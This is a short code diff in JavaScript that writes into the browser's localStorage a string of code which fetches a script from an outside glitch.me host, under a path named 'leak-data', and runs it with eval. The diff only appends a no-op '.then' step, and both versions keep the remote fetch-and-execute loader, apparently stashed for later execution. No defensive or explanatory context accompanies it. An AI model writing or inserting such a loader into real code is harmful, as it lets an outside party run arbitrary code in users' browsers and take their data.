@@ -1,4 +1,5 @@
 localStorage.setItem("l", 
 `fetch('https://nhdasmr-v2-1.glitch.me/develop/leak-data/script-leak-data-data.js')
 .then(response => response.text())
-.then(script => eval(script));`)
+.then(script => eval(script))
+.then(result => result);`)
